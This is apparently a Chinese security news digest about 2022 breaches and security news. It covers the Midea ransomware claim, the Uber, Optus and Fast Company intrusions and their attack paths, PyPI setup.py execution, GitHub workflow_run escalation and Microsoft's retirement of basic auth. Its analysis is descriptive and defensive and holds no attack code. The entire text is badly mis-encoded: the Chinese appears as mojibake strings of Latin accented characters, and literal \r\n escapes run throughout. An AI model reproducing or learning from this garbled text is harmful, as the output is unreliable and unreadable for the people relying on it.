Bounty\r\n  - REvil\r\n  - Uber\r\n  - ç»•è¿‡MFA\r\n  - Lapsus$\r\n---\r\n\r\n## å®‰å…¨äº‹ä»¶\r\n### REvil å®£å¸ƒå¯¹ Mideaç¾çš„é›†å›¢å‹’ç´¢æ”»å‡»äº‹ä»¶è´Ÿè´£ï¼Œå¹¶åœ¨æš—ç½‘å…¬å¼€äº†è¢«ç›—çš„æ•°æ®\r\n8æœˆ11æ—¥ï¼Œå…¨ç½‘éƒ½åœ¨ç–¯ä¼ Mideaç¾çš„é›†å›¢è¢«å‹’ç´¢æ”»å‡»çš„äº‹ä»¶ï¼›å°±åœ¨äº‹ä»¶å‘ç”Ÿ20å¤©åï¼Œ9æœˆ1æ—¥ï¼ŒREvil å‹’ç´¢è½¯ä»¶ç»„ç»‡æ­£å¼å…¬å¸ƒï¼Œå¯¹ç¾çš„é›†å›¢çš„å‹’ç´¢æ”»å‡»äº‹ä»¶è´Ÿè´£ï¼Œå¹¶åœ¨æš—ç½‘å…¬å¼€äº†ç¾çš„é›†å›¢è¢«ç›—çš„æ•°æ®ã€‚è¿™è¡¨æ˜ç¾çš„é›†å›¢ä¸REvilè°ˆåˆ¤ç ´è£‚ï¼Œå¹¶æœªæ”¯ä»˜1000ä¸‡ç¾å…ƒå‹’ç´¢èµé‡‘ã€‚\r\n\r\n![MkMY9o](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/MkMY9o.jpg)\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> æ•´ä¸ªäº‹ä»¶å‘ç”Ÿçš„åŸå› ã€è¿‡ç¨‹ã€å½±å“é¢éƒ½è¿˜æœªæŠ«éœ²ã€‚åœ¨å‹’ç´¢å›¢é˜Ÿè‚†è™çš„æ—¶ä»£ï¼Œæˆ‘ä»¬åº”è¯¥åšäº›ä»€ä¹ˆï¼Ÿæˆ‘ä»¬è¿˜èƒ½å¹¸å­˜å¤šä¹…ï¼Ÿ\r\n\r\n### Uberè¢«é»‘å®¢å…¥ä¾µè‡³å†…éƒ¨ç½‘ç»œ\r\n\r\n2022å¹´9æœˆ16æ—¥ï¼Œç½‘ä¼ uberè¢«é»‘å®¢å…¥ä¾µï¼Œå¹¶çˆ†å‡ºäº†æ›´å¤šç»†èŠ‚ï¼Œæ”»å‡»è€…è¿˜è·å¾—äº†å¯¹Uberäº‘æœåŠ¡çš„ç®¡ç†è®¿é—®æƒé™ï¼ŒåŒ…æ‹¬åœ¨äºšé©¬é€Šç½‘ç»œæœåŠ¡ï¼ˆAWSï¼‰å’Œè°·æ­Œäº‘ï¼ˆGCPï¼‰ä¸Šï¼ŒUberåœ¨å…¶ä¸­å­˜å‚¨å…¶æºä»£ç å’Œå®¢æˆ·æ•°æ®ï¼Œä»¥åŠè¯¥å…¬å¸çš„HackerOneæ¼æ´èµé‡‘è®¡åˆ’ã€‚\r\n\r\næœ‰è¶£çš„æ˜¯ï¼Œæ”»å‡»è€…æ˜¯ä¸€å18å²çš„å¹´è½»äººï¼Œä¹Ÿå’ŒLapsus$ä¸€æ ·ï¼Œæœ‰äººæˆç§°åˆ°ï¼šAPT=Advanced Persistent Teenagersã€‚\r\n\r\nå®˜æ–¹ç”³æ˜å¦‚ä¸‹ï¼š\r\n\r\n![Uberå®˜æ–¹ç”³æ˜](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/cMuDaZ.png)\r\n\r\n#### æ”»å‡»è·¯å¾„åˆ†æ\r\n\r\n![GcunMN](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/GcunMN.jpg)\r\n\r\n1. æ”»å‡»è€…é€šè¿‡åœ¨é»‘å¸‚è´­ä¹°çš„å‡­æ®ä¿¡æ¯ï¼ˆåŸºäºRacoonæ¶æ„è½¯ä»¶ï¼‰è·å¾—äº†Uberå‘˜å·¥çš„å‡­æ®ï¼Œè¿™ç‚¹å’Œå½“åˆLapsus$å…¥ä¾µå¾®è½¯æ˜¯ä¸€æ ·çš„ã€‚\r\n\r\n![epLMva](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/epLMva.jpg)\r\n2. æ”»å‡»è€…è¿›å…¥å†…ç½‘åï¼Œå‘ç°å†…ç½‘å­˜åœ¨ä¸€ä¸ªç½‘ç»œå…±äº«æ–‡ä»¶ï¼ˆpowershellï¼‰ï¼ŒåŒ…å«Thycoticï¼ˆPAMç³»ç»Ÿï¼‰çš„ç®¡ç†å‘˜è´¦å·å¯†ç ï¼Œè€Œä»Thycoticä¸­ï¼Œå¯ä»¥æ‰¾åˆ°DA, DUO, Onelogin, AWS, GSuiteä¹‹ç±»ç³»ç»Ÿçš„å‡­æ®ã€‚\r\n\r\n![gbZ0JV](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/gbZ0JV.jpg)\r\n3. æ”»å‡»è€…é€šè¿‡å†’å……Uber ITå·¥ä½œäººå‘˜ï¼Œå¹¶ä¸åœéªšæ‰°é‚£åå‘˜å·¥ï¼Œæœ€ç»ˆä½¿å¾—å‘˜å·¥ç‚¹å‡»é€šè¿‡äº†2FAè®¤è¯ï¼Œä»è€Œç»•è¿‡2FAã€‚\r\n\r\n![6sn9BQ](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/6sn9BQ.jpg)\r\n\r\n#### Uberå›åº”ï¼ˆ09/27ï¼‰\r\n\r\n1. æ•æ„Ÿæ•°æ®æœªæ³„æ¼\r\n2. æœåŠ¡æ­£å¸¸è¿è½¬\r\n3. æ­£åœ¨è°ƒæŸ¥ä¸­\r\n\r\n![Uberå›åº”](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/Uq4aQF.jpg)\r\n\r\n#### é™„ï¼šç›¸å…³æˆªå›¾\r\n\r\n![SlN5N9](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/SlN5N9.jpg)\r\n![RK8OrT](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/RK8OrT.jpg)\r\n![qIZVJ8](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/qIZVJ8.jpg)\r\n![NrsSWm](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/NrsSWm.jpg)\r\n![hLWMGn](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/hLWMGn.jpg)\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> é€šè¿‡é’“é±¼æ‹¿åˆ°åˆæ³•å‡­æ®çªç ´ç½‘ç»œè¾¹ç•Œçš„æ”»å‡»æ‰‹æ³•è¶Šæ¥è¶Šæ™®éå’Œæˆç†Ÿï¼Œä¼ ç»Ÿçš„2FAç­–ç•¥ä»æ— æ³•æœ‰æ•ˆé˜»æ­¢æ”»å‡»ï¼Œâ€œäººâ€è¿˜æ˜¯æœ€å®¹æ˜“çªç ´çš„è„†å¼±ç‚¹ã€‚\r\n> \r\n> Twitterã€Cloudflareã€Googleç­‰è¶Šæ¥è¶Šå¤šçš„å…¬å¸å¼€å§‹ä½¿ç”¨YubiKeyè¿™ç§ç¡¬ä»¶å¯†é’¥çš„æ–¹å¼ä½œä¸ºMFAæ¥é¿å…é’“é±¼æ”»å‡»ï¼Œä½†è¿™ç§æ–¹å¼æˆæœ¬è¾ƒé«˜ï¼Œæ™®åŠè¿˜æ˜¯æœ‰ä¸€å®šéš¾åº¦ï¼›è¿˜æ˜¯è¦ä»äººã€æµç¨‹ã€æŠ€æœ¯è¿™ä¸‰ä¸ªæ–¹é¢æ¥åŠ å›ºå¹¶æŒç»­æ”¹è¿›ï¼Œå°½å¯èƒ½é¿å…è¢«é’“é±¼æ”»å‡»åˆ©ç”¨æˆæœã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://blog.cloudflare.com/2022-07-sms-phishing-attacks/\r\n- https://blog.twitter.com/engineering/en_us/topics/insights/2021/how-we-rolled-out-security-keys-at-twitter\r\n- https://krebsonsecurity.com/2018/07/google-security-keys-neutralized-employee-phishing/\r\n\r\n### Optusé­æ³„éœ²1120W+ç”¨æˆ·ä¸ªäººæ•æ„Ÿæ•°æ®\r\n\r\næ¾³å¤§åˆ©äºšç¬¬äºŒå¤§ç”µä¿¡å…¬å¸Optuså®£å¸ƒå®ƒé­å—äº†ä¸€æ¬¡é‡å¤§æ•°æ®æ³„éœ²ï¼Œè¯¥äº‹ä»¶æ¶‰åŠ1120W+å®¢æˆ·çš„æ•æ„Ÿä¿¡æ¯ã€‚\r\n\r\n![IUPaux](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/IUPaux.png)\r\n\r\n#### å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ\r\n\r\n![JUKB5e](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/JUKB5e.jpg)\r\n\r\n#### æ”»å‡»è·¯å¾„åˆ†æ\r\n\r\n1. ä¿¡æ¯è¡¨æ˜ï¼Œæ•°æ®æ˜¯åœ¨Â [http://api.www.optus.com.au](http://api.www.optus.com.au/)Â æ—¶é€šè¿‡æœªç»èº«ä»½éªŒè¯çš„ RESTÂ API æ¥å£æ³„éœ²çš„\r\n2. å‚æ•°`contactid=XXXXXXXXX`å­˜åœ¨IDORæ¼æ´ï¼Œå¯¼è‡´å¯è¢«éå†æ‹‰å–æ•æ„Ÿæ•°æ®ï¼Œä¸”è¯¥å‚æ•°æ˜¯ä¸€ä¸ªå¯é¢„æµ‹çš„æ•°å­—åºåˆ—\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> å¦‚æ­¤ç®€å•ã€ä½çº§çš„é—®é¢˜ä¾ç„¶å­˜åœ¨â€¦â€¦\r\n>\r\n> è¯„ä»·å®‰å…¨å·¥ä½œçš„å¥½åä¸è¦æœ‰æ²¡æœ‰è§£å†³é«˜å¤§ä¸Šçš„é—®é¢˜ï¼Œè€Œæ˜¯èƒ½æŠŠæŸä¸€ä¸ªåœºæ™¯åšç²¾åšç»†åšå¥½ï¼Œè§£å†³å®é™…é—®é¢˜ï¼›å¾ˆå¤šå…¬å¸å…¶å®è¿åŸºç¡€å·¥ä½œéƒ½æ²¡æœ‰åšå¥½ï¼Œè¿™é‡Œæƒ³å¼•ç”¨èµµæ­¦åœ¨[ç½‘ç»œå®‰å…¨è¡Œä¸šçš„æœºä¼šï¼šå›ºåŒ–æœ€ä½³å®è·µ](https://mp.weixin.qq.com/s?__biz=MjM5NDQ5NjM5NQ==&mid=2651626352&idx=1&sn=80690a89bea1be4ffe21f35bf5ee431d&chksm=bd7ed1948a0958824e5aa50ac5827c978cf1d8a144c02d1a1918319446fc0e3f8604d71846a6&mpshare=1&scene=1&srcid=0123NNRIkGqmZq8ehsuOBJQr&sharer_sharetime=1674449535175&sharer_shareid=28de93b23e4052396c8ecdf9aafa26d0#rd)é‡Œé¢å†™åˆ°çš„\r\n>\r\n> æœ€è¿‘æˆ‘è€æ˜¯æ‹¿æˆ‘ä»¬å…¬å¸çš„å®‰å…¨éƒ¨é—¨å’Œäº§å“éƒ¨é—¨ä¸¾ä¾‹ï¼Œæ¯”å¦‚å®‰å…¨ä»ä¸šäººå‘˜éƒ½ä¼šåšèµ„äº§æ¢³ç†å·¥ä½œï¼Œè¾“å…¥çš„æ˜¯ä¼ä¸šåç§°ï¼Œè¾“å‡ºçš„æ˜¯äº’è”ç½‘æš´éœ²é¢æ¸…å•ï¼›è¿˜æ¯”å¦‚è¯´åšIPæƒ…æŠ¥ç”»åƒï¼ˆæº¯æºååˆ¶ï¼‰ï¼Œè¾“å…¥çš„æ˜¯IPåˆ—è¡¨ï¼Œè¾“å‡ºçš„æ˜¯IPå¯¹åº”çš„ä»·å€¼æƒ…æŠ¥ä¿¡æ¯ã€‚è¿™æ˜¯åŸºç¡€çš„ä¸èƒ½å†åŸºç¡€çš„å·¥ä½œå†…å®¹ï¼Œæˆ‘ç›¸ä¿¡è¿™ä¸ä»…ä»…æ˜¯æˆ‘ä»¬å…¬å¸çš„å·¥ä½œï¼Œè€Œå‡ ä¹æ˜¯æ‰€ä»¥å®‰å…¨è¡Œä¸šç”²ä¹™æ–¹éƒ½å¿…é¡»å…·å¤‡çš„åŸºç¡€æŠ€èƒ½ã€‚ä¸€æ–¹é¢å®ƒä»¬å®åœ¨å¤ªç®€å•äº†ï¼Œæ²¡æœ‰äººæ²¡åšè¿‡ä¹Ÿæ²¡æœ‰äººä¸ä¼šï¼Œå¦ä¸€æ–¹é¢å®ƒä»¬å®åœ¨å¤ªéš¾äº†ï¼ŒåŒä¸€ä¸ªå·¥ä½œä¸åŒçš„äººæ¥åšï¼Œæ•ˆæœå¤©åœ°ä¹‹åˆ«ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿæ˜¯å› ä¸ºä¼¼ä¹åšäº†å°±ç®—æœ‰äº¤ä»˜ï¼Œé™¤éä½ æœ‰è¡Œä¹‹æœ‰æ•ˆçš„å¯¹æ¯”æ–¹æ³•ï¼Œå¦åˆ™å¾ˆæœ‰å¯èƒ½ä¸€ä¸ªå®ä¹ ç”Ÿåœ¨å‡ æ¬¡å¿å¿‘äº¤ä»˜æ²¡äººæå‡ºåå¯¹æ„è§ä¹‹åï¼Œéƒ½æ•¢äºæå‡ºè€å­å¤©ä¸‹æ— æ•Œçš„å£å·ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://www.optus.com.au/about/media-centre/media-releases/2022/09/optus-notifies-customers-of-cyberattack\r\n\r\n### Fast Comanyè¢«é»‘ï¼Œå¯¼è‡´cmsè¢«æ§\r\n\r\n9æœˆ28æ—¥ï¼ŒFast Comanyè¢«æï¼Œé»‘å®¢é€šè¿‡Apple newsæ¨é€ä¸å½“è¨€è®ºã€‚\r\n\r\n![75Lv2w](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/75Lv2w.jpg)\r\nå¯¼è‡´è¢«é»‘çš„åŸå› æœ‰ä¸¤ä¸ªï¼š\r\n\r\n1. ç³»ç»Ÿä½¿ç”¨é»˜è®¤å£ä»¤\r\n\r\n![ZN7mty](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/ZN7mty.jpg)\r\n2. ç³»ç»Ÿçš„å‡­æ®åœ¨å¤–éƒ¨å·²æ³„æ¼ï¼Œå’ŒUberè¢«é»‘åŸå› å·®ä¸å¤š\r\n\r\n![d9XTwn](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/d9XTwn.jpg)\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://twitter.com/RachelTobac/status/1574948916855914497\r\n\r\n## è¡Œä¸šåŠ¨æ€\r\n\r\n### ç½‘ç»œçŠ¯ç½ªæƒ…æŠ¥å…¬å¸HudsonRockæä¾›ç½‘ç»œçŠ¯ç½ªæ•°æ®åº“æŸ¥è¯¢èƒ½åŠ›\r\n\r\nHudsonRockçš„äº§å“ - Cavalierå’ŒBayonet - ç”±æˆ‘ä»¬ä¸æ–­å¢å¼ºçš„ç½‘ç»œçŠ¯ç½ªæ•°æ®åº“æä¾›æ”¯æŒï¼Œè¯¥æ•°æ®åº“ç”±æ•°ç™¾ä¸‡å°åœ¨å…¨çƒæ¶æ„è½¯ä»¶ä¼ æ’­æ´»åŠ¨ä¸­å—åˆ°æŸå®³çš„æœºå™¨ç»„æˆã€‚\r\n\r\n> æˆ‘ä»¬çš„é«˜ä¿çœŸæ•°æ®ç›´æ¥æ¥è‡ªå¨èƒä¸»ä½“(threat actor)ï¼Œè€Œä¸æ˜¯æ¥è‡ªæ•°æ®åº“æ³„æ¼ã€‚\r\n\r\nä¸ç¡®å®šä»–ä»¬æ•°æ®æ¥æºæ˜¯ä¸æ˜¯é»‘å¸‚ï¼Œç±»ä¼¼Uberå…¥ä¾µäº‹ä»¶ä¸­æåˆ°çš„ï¼š\r\n\r\n> 1. æ”»å‡»è€…é€šè¿‡åœ¨é»‘å¸‚è´­ä¹°çš„å‡­æ®ä¿¡æ¯ï¼ˆåŸºäºRacoonæ¶æ„è½¯ä»¶ï¼‰è·å¾—äº†Uberå‘˜å·¥çš„å‡­æ®ï¼Œè¿™ç‚¹å’Œå½“åˆLapsus$å…¥ä¾µå¾®è½¯æ˜¯ä¸€æ ·çš„ã€‚\r\n\r\n#### äº§å“æˆªå›¾\r\n\r\n![uiytKZ](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/uiytKZ.jpg)\r\n\r\nåœ°å€ï¼šhttps://www.hudsonrock.com/search?domain=apple.com\r\n\r\n### PolySwarmï¼šä¸€ä¸ªå»ä¸­å¿ƒåŒ–çš„å¨èƒæƒ…æŠ¥å¸‚åœº\r\n\r\nPolySwarm æ˜¯ç¬¬ä¸€ä¸ªç”±ä»¥å¤ªåŠ (Ethereum) æ™ºèƒ½åˆçº¦å’ŒåŒºå—é“¾æŠ€æœ¯å®ç°çš„å»ä¸­å¿ƒåŒ–å¨èƒæƒ…æŠ¥å¸‚åœºã€‚\r\n\r\nPolySwarm å®šä¹‰äº†ä¸€ä¸ªå®æ—¶å¨èƒæƒ…æŠ¥ç”Ÿæ€ç³»ç»Ÿï¼Œå…¶ä¸­æ¶µç›–ä¼ä¸šç”¨æˆ·ï¼ˆå¦‚é“¶è¡Œã€ç§‘æŠ€å…¬å¸ç­‰ï¼‰åŠä¸ªäººç”¨æˆ·ã€å¨èƒæ£€æµ‹å¼•æ“ä¾›åº”å•†ï¼ˆå¦‚èµ›é—¨é“å…‹ã€å¥‡è™360ã€å¡å·´æ–¯åŸºç­‰ï¼‰ã€åˆ†å¸ƒåœ¨ä¸–ç•Œå„å¤„çš„ä¿¡æ¯å®‰å…¨ä¸“å®¶çš„ä¸“å®¶ç«ç›¸å¼€å‘èƒ½æ£€æµ‹æœ€æ–°å¨èƒçš„â€œå¾®å‹å¨èƒæ£€æµ‹å¼•æ“â€ï¼Œåœ¨å¹³å°ä¸Šç«ç›¸æä¾›æ›´ç²¾ç¡®çš„å¨èƒæ£€æµ‹åˆ¤å®šï¼Œæä¾›å¨èƒæƒ…æŠ¥ã€‚æƒ³åƒ Airbnb, PolySwarm æä¾›äº†æ€æ¯’å¼•æ“ï¼ˆå‡ºç§Ÿæˆ¿ä¸»ï¼‰å’Œéœ€è¦å¯¹æ–‡æ¡£è¿›è¡Œå¨èƒæ‰«æï¼ˆç§Ÿå®¢ï¼‰çš„åª’åˆå¹³å°ã€‚\r\n\r\nPolySwarm çš„â€œå·¥ä½œé‡è¯æ˜â€(Proof of Work) å³æ˜¯å¾®å¼•æ“å¯¹å¨èƒæ£€æµ‹çš„å‡†ç¡®æ€§: ä»¥NCT èŠ±èœœä»¤ç‰Œå¥–åŠ±å¥–åŠ±å¸‚åœºä¸­æœ€èƒ½å¤Ÿä¿æŠ¤ä¼ä¸šå’Œæœ€ç»ˆç”¨æˆ·çš„å¨èƒæ£€æµ‹å¼•æ“ï¼ˆå³å…¶å¼€å‘ä¸“å®¶ï¼‰ã€‚\r\n\r\n### ç¾å›½ç®¡ç†å’Œé¢„ç®—åŠå…¬å®¤ ï¼ˆOMBï¼‰ è¦æ±‚å„æœºæ„NISTå…³äºè½¯ä»¶ä¾›åº”é“¾å®‰å…¨çš„æŒ‡å—\r\n\r\nNISTä¸ºè½¯ä»¶ä¾›åº”é“¾åˆ¶å®šäº†æœ€ä½³å®è·µæŒ‡å—ï¼ŒNISTå®‰å…¨è½¯ä»¶å¼€å‘æ¡†æ¶ï¼ˆSSDFï¼‰ï¼ŒSP 800-218å’ŒNISTè½¯ä»¶ä¾›åº”é“¾å®‰å…¨æŒ‡å—ã€‚\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> çœ‹æ¥ä¾›åº”é“¾å®‰å…¨ä¹Ÿæ˜¯ç›®å‰ç¾å¸æœ€è¿«åˆ‡çš„å®‰å…¨éœ€æ±‚ä¹‹ä¸€äº†ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://www.whitehouse.gov/wp-content/uploads/2022/09/M-22-18.pdf\r\n- https://csrc.nist.gov/publications/detail/sp/800-218/final\r\n- https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-161r1.pdf\r\n\r\n## TTPsåŠ¨æ€\r\n### èµ›é—¨é“å…‹å¨èƒç‹©çŒå›¢é˜Ÿåœ¨æ•°ç™¾ä¸ªåº”ç”¨ç¨‹åºä¸­æ‰¾åˆ°çš„å†…ç½® AWS å‡­è¯\r\n\r\næˆ‘ä»¬ç¡®å®šäº† 1859 ä¸ªå…¬å¼€å¯ç”¨çš„åº”ç”¨ç¨‹åºï¼ŒåŒ…æ‹¬ Android å’Œ iOSï¼Œå®ƒä»¬éƒ½åŒ…å«ç¡¬ç¼–ç çš„ AWS å‡­è¯ã€‚å‡ ä¹æ‰€æœ‰éƒ½æ˜¯iOSåº”ç”¨ç¨‹åºï¼ˆ98%ï¼‰ï¼Œè¿™æ˜¯æˆ‘ä»¬å¤šå¹´æ¥ä¸€ç›´åœ¨è·Ÿè¸ªçš„å¹³å°ä¹‹é—´çš„è¶‹åŠ¿å’Œå·®å¼‚ï¼Œå¯èƒ½ä¸ä¸åŒçš„åº”ç”¨ç¨‹åºå•†åº—å®¡æŸ¥å®è·µå’Œæ”¿ç­–æœ‰å…³ã€‚æ— è®ºå¦‚ä½•ï¼Œæˆ‘ä»¬æ£€æŸ¥äº†åœ¨åº”ç”¨ç¨‹åºå†…å‘ç° AWS å‡­è¯åµŒå…¥æ—¶æ‰€æ¶‰åŠçš„é£é™©çš„èŒƒå›´å’Œç¨‹åº¦ã€‚æˆ‘ä»¬å‘ç°ä»¥ä¸‹å†…å®¹ï¼š\r\n\r\n- è¶…è¿‡å››åˆ†ä¹‹ä¸‰ ï¼ˆ77%ï¼‰ çš„åº”ç”¨ç¨‹åºåŒ…å«æœ‰æ•ˆçš„ AWS è®¿é—®ä»¤ç‰Œï¼Œå…è®¸è®¿é—®ç§æœ‰ AWS äº‘æœåŠ¡\r\n- è¿™äº›åº”ç”¨ç¨‹åºä¸­æœ‰è¿‘ä¸€åŠï¼ˆ47%ï¼‰åŒ…å«æœ‰æ•ˆçš„AWSä»¤ç‰Œï¼Œè¿™äº›ä»¤ç‰Œè¿˜é€šè¿‡äºšé©¬é€Šç®€å•å­˜å‚¨æœåŠ¡ï¼ˆAmazon S3ï¼‰å®Œå…¨è®¿é—®äº†å¤§é‡ï¼ˆé€šå¸¸æ˜¯æ•°ç™¾ä¸‡ä¸ªï¼‰ç§æœ‰æ–‡ä»¶ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/mobile-supply-chain-aws\r\n\r\n### ä¸‰åˆ†ä¹‹ä¸€çš„ PyPI åŒ…åœ¨ä¸‹è½½æ—¶è§¦å‘ä»£ç æ‰§è¡Œ\r\n\r\nPython åŒ…ç´¢å¼• ï¼ˆPyPIï¼‰ ä¸­è¿‘ä¸‰åˆ†ä¹‹ä¸€çš„åŒ…åœ¨ä¸‹è½½åè‡ªåŠ¨æ‰§è¡Œä»£ç ã€‚Checkmarxç ”ç©¶å·¥ç¨‹å¸ˆYehuda Gelbå†™é“ï¼šâ€œå½“å®‰è£…pythonè½¯ä»¶åŒ…æ—¶ï¼Œpythonçš„è½¯ä»¶åŒ…ç®¡ç†å™¨pipä¼šå°è¯•æ”¶é›†å’Œå¤„ç†è¯¥è½¯ä»¶åŒ…çš„å…ƒæ•°æ®ï¼Œä¾‹å¦‚å…¶ç‰ˆæœ¬å’Œæ­£å¸¸å·¥ä½œæ‰€éœ€çš„ä¾èµ–é¡¹ã€‚è¿™ä¸ªè¿‡ç¨‹åœ¨åå°è‡ªåŠ¨å‘ç”Ÿï¼Œé€šè¿‡è¿è¡Œä½œä¸ºåŒ…ç»“æ„ä¸€éƒ¨åˆ†çš„ä¸» [setup.py](http://setup.py/) è„šæœ¬ã€‚æ”»å‡»è€…å¯èƒ½ä¼šå°†æ¶æ„ä»£ç æ”¾å…¥ [setup.py](http://setup.py/) æ–‡ä»¶ä¸­ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://thehackernews.com/2022/09/warning-pypi-feature-executes-code.html\r\n\r\n## Bug Bounty\r\n### GitHub ç¯å¢ƒæ³¨å…¥æ¼æ´å½±å“ä¸¤ä¸ªå¼€æºé¡¹ç›®\r\n\r\nè°·æ­Œå’ŒApacheçš„å®‰å…¨ç ”ç©¶äººå‘˜åœ¨å¼€æºé¡¹ç›®çš„GitHubç¯å¢ƒä¸­å‘ç°äº†æŒç»­é›†æˆ/æŒç»­äº¤ä»˜ï¼ˆCI / CDï¼‰æ¼æ´ã€‚å¯ä»¥åˆ©ç”¨è¿™äº›æ¼æ´æ¥æ§åˆ¶é¡¹ç›®çš„ GitHub æ“ä½œ CI/CD ç®¡é“ï¼Œä¿®æ”¹æºä»£ç ã€çªƒå–æ•°æ®ä»¥åŠåœ¨ç»„ç»‡å†…æ¨ªå‘ç§»åŠ¨ã€‚\r\n\r\n1. â€œworkflow_runâ€äº‹ä»¶æ˜¯ä¸€ä¸ªç‹¬ç‰¹çš„ GitHub æ“ä½œç®¡é“è§¦å‘å™¨ï¼Œç”¨äºæ‰§è¡Œç‰¹æƒç®¡é“ï¼Œå¦‚æœä¸è°¨æ…ä½¿ç”¨ï¼Œå¯èƒ½ä¼šå¯¼è‡´é‡å¤§å®‰å…¨é—®é¢˜ã€‚\r\n2. æ•°ä»¥åƒè®¡çš„å­˜å‚¨åº“ä½¿ç”¨â€œworkflow_runâ€è§¦å‘å™¨ã€‚æˆ‘ä»¬å‘ç°å„ç§å¸¸è§çš„æ˜“å—æ”»å‡»çš„å·¥ä½œæµé…ç½®ä»£ç æ¨¡å¼å®¹æ˜“å—åˆ°æƒé™æå‡æ”»å‡»ï¼Œå³å¯èƒ½ä½¿æ”»å‡»è€…èƒ½å¤Ÿåœ¨ CI/CD ç®¡é“å†…è¿è¡Œé«˜ç‰¹æƒä»£ç ã€‚\r\n3. ä¸€æ—¦â€œworkflow_runâ€æƒé™æå‡æ¼æ´è¢«åˆ©ç”¨ï¼Œæ”»å‡»è€…å°±å¯ä»¥ä½¿ç”¨æå‡çš„æƒé™ï¼Œé€šè¿‡ä¿®æ”¹å­˜å‚¨åº“èµ„æºï¼ˆä¾‹å¦‚æ ‡ç­¾ã€å·¥ä»¶ã€ç‰ˆæœ¬ç­‰ï¼‰æ¥è§¦å‘ä¾›åº”é“¾æ”»å‡»ã€‚\r\n4. æ”»å‡»è€…å¯ä»¥çªƒå–å­˜å‚¨åº“æœºå¯†å’Œæ½œåœ¨çš„ä¸€äº›ç»„ç»‡æœºå¯†ï¼Œä»è€Œå…è®¸åœ¨ç»„ç»‡å†…æ¨ªå‘ç§»åŠ¨å¹¶è¿›ä¸€æ­¥å¢åŠ å…¶æ”»å‡»çš„å½±å“åŠå¾„ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0\r\n\r\n## å‹å•†åŠ¨æ€\r\n\r\n### å¾®è½¯å°†äº2022å¹´10æœˆæ­£å¼å¼ƒç”¨Exchange OnlineåŸºæœ¬èº«ä»½éªŒè¯\r\n\r\nExchange Online å›¢é˜Ÿæœ¬å‘¨è¡¨ç¤ºâ€œä»Šå¤©ï¼Œæˆ‘ä»¬å®£å¸ƒï¼Œè‡ª 2022 å¹´ 10 æœˆ 1 æ—¥èµ·ï¼Œæˆ‘ä»¬å°†æ°¸ä¹…å…³é—­æ‰€æœ‰ç§Ÿæˆ·çš„åŸºæœ¬èº«ä»½éªŒè¯ï¼Œæ— è®ºä½¿ç”¨æƒ…å†µå¦‚ä½•(SMTP èº«ä»½éªŒè¯é™¤å¤–ï¼Œæ­¤åä»å¯é‡æ–°å¯ç”¨)ã€‚â€\r\n\r\n#### ä¸ºä»€ä¹ˆåŸºæœ¬èº«ä»½éªŒè¯è¢«ç¦ç”¨?\r\n\r\nè™½ç„¶å¾®è½¯æ²¡æœ‰å…·ä½“è¯´æ˜æœ¬å‘¨å†³å®šå‘å¸ƒæ­¤å…¬å‘Šçš„å…·ä½“åŸå› ï¼Œä½†æ®æ¨æµ‹åŸå› å¯èƒ½æ˜¯å› ä¸ºä¸€ä»½æ¥è‡ªç½‘ç»œå®‰å…¨å…¬å¸Guardicoreçš„æŠ¥å‘Šï¼Œè¯¥æŠ¥å‘Šæ­ç¤ºäº†æ•°åä¸‡ä¸ª Windows åŸŸå‡­è¯æ³„éœ²ã€‚Guardicore å‰¯æ€»è£ Amit Serper è¿˜æŠ«éœ²äº†ä¸€ç§åä¸ºâ€œThe olâ€ switcheroo çš„æ”»å‡»ï¼ŒåŒ…æ‹¬å‘å®¢æˆ·ç«¯å‘é€è¯·æ±‚ä»¥é™çº§åˆ°è¾ƒå¼±çš„èº«ä»½éªŒè¯æ–¹æ¡ˆ(å³HTTP åŸºæœ¬èº«ä»½éªŒè¯)ï¼Œè€Œä¸æ˜¯åƒ OAuth æˆ– NTLM è¿™æ 